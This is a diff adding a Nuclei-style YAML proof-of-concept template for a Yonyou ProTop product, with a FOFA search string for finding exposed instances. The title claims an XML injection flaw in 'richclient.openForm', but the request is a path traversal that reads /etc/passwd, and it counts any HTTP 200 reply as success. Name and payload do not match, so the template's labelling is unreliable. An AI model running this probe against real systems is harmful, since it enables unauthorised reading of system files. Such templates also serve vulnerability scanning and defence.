@@ -1,0 +1,21 @@
+id: poc-rcvgmmzsx8oibpoe
+info:
+  name: 时空用友-richclient.openForm存在xml注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rcvgmmzsx8oibpoe'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rcvgmmzsx8oibpoe
+    fofa: body="<title>ProTop"
+http:
+- raw:
+  - 'GET /pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
